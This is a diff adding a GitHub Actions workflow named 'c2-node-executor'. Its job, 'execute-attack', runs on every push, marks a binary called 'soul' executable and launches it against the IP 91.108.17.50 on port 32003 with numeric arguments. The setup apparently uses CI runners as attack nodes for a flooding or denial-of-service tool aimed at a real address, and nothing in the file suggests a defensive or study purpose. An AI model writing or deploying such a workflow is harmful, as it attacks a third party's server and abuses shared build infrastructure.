@@ -1,0 +1,12 @@
+name: c2-node-executor
+on: [push]
+
+jobs:
+  execute-attack:
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v3
+      - name: Setup and Execute
+        run: |
+          chmod +x soul
+          ./soul 91.108.17.50 32003 100 400
